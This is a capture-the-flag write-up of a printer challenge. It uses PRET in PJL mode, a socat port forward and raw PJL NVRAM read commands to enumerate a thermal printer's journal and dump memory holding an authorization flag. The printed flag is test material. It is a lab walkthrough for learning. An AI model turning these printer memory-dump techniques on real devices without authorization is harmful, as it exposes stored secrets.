### Challenge Description
```
Thermal Receipt
Keir and his undercity runners recovered a forgotten Eastreach ration kiosk after Damas Marrowcairn sent clerks to strip the counting terminal and burn the paper ledger. They missed the networked thermal receipt printer bolted beneath the counter. This is a printer challenge, not a kiosk or web-application challenge: the exposed service speaks a raw printer protocol, so PRET in PJL mode is the intended starting point. If the printer still remembers the right transaction, it may hold the authorization token needed to move supplies through Crownspire sealed checkpoints.
```

In short: Networked thermal printer speaking raw PJL → PRET enumeration of the filesystem → discover Electronic Journal receipts → one receipt points to a specific NVRAM address → must first “remind” the printer of the transaction by reading the journal → then dump NVRAM to recover the flag.

### Tools & Environment
- PRET (Printer Exploitation Toolkit) – https://github.com/RUB-NDS/PRET
- `socat` (mandatory, because the service is **not** on 9100)
- Python 3 (PRET needs a one-line patch to work)
- Optional: `xxd`, `strings`, `debug` mode inside PRET
- Starting point: only a single TCP port that speaks raw printer protocol

### 1. Environment Setup & First Round of Pain

The service is on a high, non-standard port. PRET hard-codes 9100, so the first thing everyone does is:

```bash
socat TCP-LISTEN:9100,fork,reuseaddr TCP:<TARGET_IP>:<TARGET_PORT> &
python3 pret.py 127.0.0.1 pjl
```

Immediately after the first successful `nvram dump` we hit the classic Python 3 landmine:

```
TypeError: a bytes-like object is required, not 'str'
```

**Stupid mistakes / pitfalls #1:**
- Spending time wondering why the dump “timed out” instead of reading the traceback
- Trying to run PRET under Python 2 (it is long dead)
- Forgetting that the fix is a single line in `helper.py`

**Fix:**
```bash
sed -i 's/f.write(data)/f.write(data if isinstance(data, bytes) else data.encode("latin1"))/' helper.py
```

Without this patch every subsequent dump is useless.

### 2. Basic Enumeration

Once connected:

```bash
id
info config
info filesys
env
ls
find .
```

We learn:
- Model: `RiverGate RG-T80II Thermal Receipt Printer`
- `EJOURNAL=ON`
- `EJINDEX=NVRAM [READONLY]`
- Volume `0:` is a small FLASH filesystem
- Directory tree contains `config/`, `journal/`, `spool/`, and a `readme.txt`

`readme.txt` and `spool/README.txt` both explicitly say that closed receipts are retained under `0:/journal`.

### 3. The Journal – The Real Starting Point

```bash
cat journal/last.txt          # → receipt_0003.txt
cat journal/receipt_0000.txt
cat journal/receipt_0001.txt
cat journal/receipt_0002.txt
cat journal/receipt_0003.txt
```

The first three receipts contain normal `AUTH CODE: RG-xxxx-OK`.  
The fourth one is different:

```
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
```

This is the entire challenge in one line. The token lives at NVRAM address 53264 and is 60 bytes long.

### 4. The NVRAM Rabbit Hole

PRET’s NVRAM support is thin:

```bash
nvram dump
nvram dump all
nvram read <addr>
```

**What we tried (and why it failed for a long time):**

- `nvram read 53264` → almost always `DATA=0`
- Raw `@PJL RNVRAM ADDRESS=53264` via `nc` → timeout or zero
- Trying hex addresses (`0xd010`)
- Path tricks (`NVRAM:EJ_AUTH_0421`, `chvol`, etc.)
- Editing the hard-coded `memspace` list inside `pjl.py` to force only the interesting range
- Running `nvram dump all` (samples every 512 bytes up to 262144) – extremely slow and mostly nulls
- Turning on `debug` and staring at the raw traffic

On a brand-new instance the interesting region contained only the key name:

```
EJ_AUTH_0421................
```

The actual flag bytes were missing.

### 5. The Stateful “Remember the Transaction” Discovery

This was the key insight that cost the most time.

The NVRAM value is **not** statically present.  
It only materialises **after** the printer is reminded of the last transaction.

The required sequence is therefore:

```bash
cat journal/last.txt
cat journal/receipt_0003.txt
nvram dump
```

Only after the two `cat` commands does the subsequent dump contain the flag right after the key name:

```
EJ_AUTH_0421.HTB{th3rm4l_j0urn4l_r3c4ll_....}
```

If you dump first, the value is empty.  
If you regenerate the Docker instance, the value is present again — until the first successful dump clears it.

This matches the flavour text perfectly: “If the printer still remembers the right transaction…”

### 6. Final Extraction

On a fresh instance, after the mandatory journal interaction:

```bash
nvram dump
```

Local verification:

```bash
strings nvram/127.0.0.1
xxd nvram/127.0.0.1
```

Complete flag (instance-dependent hash):

```
HTB{th3rm4l_j0urn4l_r3c4ll_9980f6f29941423a2fb5b6a608fea1eb}
```

### 7. All the Stupid Things We Hit

| Problem | What happened | Fix |
|---------|---------------|-----|
| Port is not 9100 | PRET cannot connect | `socat` forward |
| Python 3 `str`/`bytes` crash | `nvram dump` dies while writing the file | one-line patch in `helper.py` |
| Dumping NVRAM before reading the journal | Only the key name appears, value is null | **Must** `cat` the receipt first |
| Instance is stateful | Flag disappears after the first successful dump | Regenerate Docker and repeat the exact sequence |
| Restricting `memspace` too aggressively | Flag is truncated mid-string | Keep (or slightly enlarge) the original range that already covers 53248–59648 |
| Trying to treat the PEM-style `*` art as data | Nothing useful | Flavour text only |
| Assuming single-byte `nvram read` would work | Always returned 0 | Bulk `nvram dump` after journal interaction is required |
| Running long `nvram dump all` sessions | Wasted time, mostly zeros | The default `memspace` already contains the needed addresses |

### 8. Lessons Learned

1. The challenge author told us the exact starting point (“PRET in PJL mode”) — believe them.
2. Electronic Journal / job-retention features are classic places for leftover secrets on printers.
3. Some printer state is **lazy**: the interesting NVRAM content only appears after you force the device to recall the last transaction.
4. Tooling friction (Python 3 compatibility, non-standard ports, stateful instances) consumed far more time than the actual vulnerability.
5. When a dump looks empty, the problem is often sequencing or instance state, not the address itself.
6. Always keep a clean, reproducible sequence of commands; once the instance is “used”, the flag vanishes until regeneration.

### One-sentence path

Raw PJL printer → PRET → read the Electronic Journal receipt that points to NVRAM → force the printer to remember the transaction → dump the NVRAM region → flag.